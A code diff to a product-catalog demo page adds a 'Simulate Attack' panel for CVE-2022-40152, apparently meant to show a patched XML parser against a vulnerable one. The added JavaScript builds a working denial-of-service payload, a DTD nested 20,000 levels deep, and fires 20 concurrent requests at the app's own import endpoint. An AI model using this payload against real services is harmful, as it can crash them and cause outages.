@@ -40,6 +40,16 @@
 
   .loading { text-align: center; padding: 3rem; color: var(--muted); }
   .section-title { font-size: 1.1rem; font-weight: 600; margin-bottom: 1rem; }
+
+  .attack-panel { background: var(--card); border-radius: 8px; padding: 1.5rem; margin-bottom: 2rem; box-shadow: 0 1px 3px rgba(0,0,0,.1); border-left: 4px solid var(--danger); }
+  .attack-panel h2 { font-size: 1.1rem; margin-bottom: .5rem; }
+  .attack-panel p { font-size: .9rem; color: var(--muted); margin-bottom: 1rem; line-height: 1.5; }
+  .attack-btn { background: var(--danger); color: #fff; border: none; padding: .6rem 1.5rem; border-radius: 4px; font-size: .9rem; font-weight: 600; cursor: pointer; transition: opacity .15s; }
+  .attack-btn:hover { opacity: .85; }
+  .attack-btn:disabled { opacity: .5; cursor: not-allowed; }
+  .attack-result { margin-top: 1rem; padding: .75rem 1rem; border-radius: 4px; font-size: .85rem; font-family: 'Red Hat Mono', monospace; line-height: 1.6; display: none; }
+  .attack-result.error { background: #fce4e4; color: var(--danger); display: block; }
+  .attack-result.success { background: #e6f5e2; color: var(--success); display: block; }
 </style>
 </head>
 <body>
@@ -63,6 +73,15 @@
         <tr><td colspan="3" class="loading">Loading...</td></tr>
       </tbody>
     </table>
+  </div>
+
+  <div class="attack-panel" id="attack-panel">
+    <h2>CVE-2022-40152 &mdash; Simulate Attack</h2>
+    <p>Sends a crafted XML payload with deeply nested DTD declarations to the <code>/api/products/import</code> endpoint.
+       In the vulnerable version, this triggers unbounded recursion in the Woodstox parser, crashing the service.
+       The Lightwell-patched version rejects it at a recursion depth limit of 500.</p>
+    <button class="attack-btn" id="attack-btn" onclick="runExploit()">Send Exploit Payload</button>
+    <div class="attack-result" id="attack-result"></div>
   </div>
 
   <div class="section-title">Products</div>
@@ -143,6 +162,58 @@ function esc(s) {
 }
 
 init();
+
+function buildPayload() {
+  const depth = 20000;
+  return '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ' +
+    '('.repeat(depth) + 'a' + ')'.repeat(depth) + '>]><foo/>';
+}
+
+async function runExploit() {
+  const btn = document.getElementById('attack-btn');
+  const result = document.getElementById('attack-result');
+  btn.disabled = true;
+  btn.textContent = 'Sending...';
+  result.className = 'attack-result';
+  result.style.display = 'none';
+
+  const payload = buildPayload();
+  const CONCURRENT = 20;
+
+  const send = () => fetch('/api/products/import', {
+    method: 'POST',
+    headers: { 'Content-Type': 'text/plain' },
+    body: payload
+  });
+
+  try {
+    const responses = await Promise.allSettled(
+      Array.from({ length: CONCURRENT }, send)
+    );
+    const fulfilled = responses.filter(r => r.status === 'fulfilled');
+    const failed = responses.filter(r => r.status === 'rejected');
+    const serverErrors = fulfilled.filter(r => r.value.status >= 500);
+
+    if (failed.length > 0 || serverErrors.length > 0) {
+      result.className = 'attack-result error';
+      result.innerHTML = 'Service crashed or errored.<br>' +
+        failed.length + ' of ' + CONCURRENT + ' requests failed (connection lost).<br>' +
+        serverErrors.length + ' returned HTTP 500 (StackOverflowError).';
+    } else {
+      const body = await fulfilled[0].value.json().catch(() => ({}));
+      result.className = 'attack-result success';
+      result.innerHTML = 'Payload rejected safely.<br>' +
+        'All ' + CONCURRENT + ' requests handled cleanly.' +
+        (body.message ? '<br>' + body.message : '');
+    }
+  } catch (e) {
+    result.className = 'attack-result error';
+    result.innerHTML = 'Service unreachable — application crashed.';
+  }
+
+  btn.disabled = false;
+  btn.textContent = 'Send Exploit Payload';
+}
 </script>
 </body>
 </html>
